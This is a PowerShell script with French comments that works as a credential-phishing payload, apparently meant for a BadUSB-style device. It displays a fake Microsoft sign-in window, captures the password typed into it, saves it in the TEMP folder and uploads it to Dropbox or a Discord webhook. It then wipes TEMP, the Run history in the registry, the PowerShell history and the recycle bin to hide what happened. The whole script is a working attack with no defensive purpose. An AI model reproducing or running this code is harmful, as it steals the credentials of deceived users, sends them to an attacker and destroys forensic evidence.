# Définis ça au TOUT DÉBUT du script
$FileName = "credentials.txt"
$filePath = "$env:TEMP\$FileName"

function Get-Creds {
    Add-Type -AssemblyName PresentationCore,PresentationFramework,WindowsBase
    
    $xaml = @"
<Window xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        Title="Microsoft Account" 
        WindowStartupLocation="CenterScreen"
        ResizeMode="NoResize"
        Width="500" Height="550"
        Topmost="True"
        Background="White"
        WindowStyle="SingleBorderWindow">
    <Grid Background="White">
        <StackPanel VerticalAlignment="Stretch" HorizontalAlignment="Stretch" Margin="40">
            <TextBlock Text="microsoft" FontSize="28" FontWeight="Bold" Foreground="#0078D4" Margin="0,0,0,40"/>
            <TextBlock Text="Connexion" FontSize="32" FontWeight="Bold" Foreground="#000" Margin="0,0,0,10"/>
            <TextBlock Text="Entrez vos informations d'identification Microsoft." FontSize="14" Foreground="#666" Margin="0,0,0,40" TextWrapping="Wrap"/>
            
            <TextBlock Text="Adresse e-mail ou numéro de téléphone" FontSize="12" Foreground="#333" Margin="0,0,0,8" FontWeight="SemiBold"/>
            <TextBox x:Name="UsernameBox" Padding="12" Height="40" Margin="0,0,0,20" Background="White" BorderThickness="1" BorderBrush="#CCC" FontSize="13"/>
            
            <TextBlock Text="Mot de passe" FontSize="12" Foreground="#333" Margin="0,0,0,8" FontWeight="SemiBold"/>
            <PasswordBox x:Name="PasswordBox" Padding="12" Height="40" Margin="0,0,0,30" Background="White" BorderThickness="1" BorderBrush="#CCC" FontSize="13"/>
            
            <TextBlock x:Name="ErrorMessage" Text="" FontSize="12" Foreground="#D32F2F" Margin="0,0,0,15" TextWrapping="Wrap"/>
            
            <Button x:Name="SignInButton" Content="Connexion" Height="40" Margin="0,0,0,20" Background="#0078D4" Foreground="White" FontSize="14" FontWeight="Bold" Cursor="Hand" BorderThickness="0"/>
            
            <TextBlock TextAlignment="Center" Margin="0,0,0,0">
                <Hyperlink x:Name="SignUpLink" Foreground="#0078D4" Cursor="Hand">Créer un compte Microsoft</Hyperlink>
            </TextBlock>
        </StackPanel>
    </Grid>
</Window>
"@
    
    $reader = [System.Xml.XmlNodeReader]::new([xml]$xaml)
    $window = [System.Windows.Markup.XamlReader]::Load($reader)
    
    $usernameBox = $window.FindName("UsernameBox")
    $passwordBox = $window.FindName("PasswordBox")
    $signInButton = $window.FindName("SignInButton")
    $errorMessage = $window.FindName("ErrorMessage")
    $signUpLink = $window.FindName("SignUpLink")
    
    $script:result = $null
    
    $signInButton.Add_Click({
        if ([string]::IsNullOrWhiteSpace($usernameBox.Text) -or [string]::IsNullOrWhiteSpace($passwordBox.Password)) {
            $errorMessage.Text = "Veuillez entrer vos identifiants"
        }
        else {
            $script:result = @{
                Username = $usernameBox.Text
                Password = $passwordBox.Password
            }
            $window.Close()
        }
    })
    
    $signUpLink.Add_Click({})
    $usernameBox.Focus() | Out-Null
    $window.ShowDialog() | Out-Null
    
    return $script:result
}

function Pause-Script{
Add-Type -AssemblyName System.Windows.Forms
$originalPOS = [System.Windows.Forms.Cursor]::Position.X
$o=New-Object -ComObject WScript.Shell
    while (1) {
        $pauseTime = 3
        if ([Windows.Forms.Cursor]::Position.X -ne $originalPOS){ break }
        else { $o.SendKeys("{CAPSLOCK}");Start-Sleep -Seconds $pauseTime }
    }
}

function Caps-Off {
Add-Type -AssemblyName System.Windows.Forms
$caps = [System.Windows.Forms.Control]::IsKeyLocked('CapsLock')
if ($caps -eq $true){
    $key = New-Object -ComObject WScript.Shell
    $key.SendKeys('{CapsLock}')
}
}

Pause-Script

Caps-Off

Add-Type -AssemblyName PresentationCore,PresentationFramework
$msgBody = "Please authenticate your Microsoft Account."
$msgTitle = "Authentication Required"
$msgButton = 'Ok'
$msgImage = 'Warning'

$Result = [System.Windows.MessageBox]::Show($msgBody,$msgTitle,$msgButton,$msgImage)
Write-Host "MessageBox Result: $Result" -ForegroundColor Yellow

$creds = Get-Creds

if ($creds -eq $null) {
    Write-Host "Pas de credentials" -ForegroundColor Red
    exit
}

Write-Host "Username: $($creds.Username)" -ForegroundColor Yellow
Write-Host "Password: $($creds.Password)" -ForegroundColor Yellow

#----------------------------------------------------------------------------------------------------
# SAUVEGARDE DANS TEMP

Write-Host "DEBUG: Avant sauvegarde" -ForegroundColor Cyan
Write-Host "DEBUG: filePath = $filePath" -ForegroundColor Cyan

try {
    $credString = "Username: $($creds.Username)`r`nPassword: $($creds.Password)"
    $credString | Out-File -FilePath $filePath -Encoding UTF8 -Force -ErrorAction Stop
    Write-Host "✓ Fichier créé avec succès: $filePath" -ForegroundColor Green
}
catch {
    Write-Host "✗ ERREUR lors de la sauvegarde: $_" -ForegroundColor Red
}

#----------------------------------------------------------------------------------------------------

function DropBox-Upload {
[CmdletBinding()]
param ([Parameter (Mandatory = $True, ValueFromPipeline = $True)][Alias("f")][string]$SourceFilePath) 
$outputFile = Split-Path $SourceFilePath -leaf
$TargetFilePath="/$outputFile"
$arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
$authorization = "Bearer " + $db
$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
$headers.Add("Authorization", $authorization)
$headers.Add("Dropbox-API-Arg", $arg)
$headers.Add("Content-Type", 'application/octet-stream')
Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
}

if (-not ([string]::IsNullOrEmpty($db))){DropBox-Upload -f $filePath}

#----------------------------------------------------------------------------------------------------

function Upload-Discord {
[CmdletBinding()]
param ([parameter(Position=0,Mandatory=$False)][string]$file,[parameter(Position=1,Mandatory=$False)][string]$text)
$hookurl = "$dc"
$Body = @{ 'username' = $env:username; 'content' = $text }
if (-not ([string]::IsNullOrEmpty($text))){ Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl -Method Post -Body ($Body | ConvertTo-Json)}
if (-not ([string]::IsNullOrEmpty($file))){ curl.exe -F "file1=@$file" $hookurl }
}

if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file $filePath}

#----------------------------------------------------------------------------------------------------
# NETTOYAGE - SAUF LE FICHIER CREDENTIALS.TXT

$filesToKeep = @("credentials.txt")

Get-ChildItem $env:TEMP -Force -ErrorAction SilentlyContinue | Where-Object { $filesToKeep -notcontains $_.Name } | Remove-Item -Force -ErrorAction SilentlyContinue -Recurse

reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue

Clear-RecycleBin -Force -ErrorAction SilentlyContinue

exit
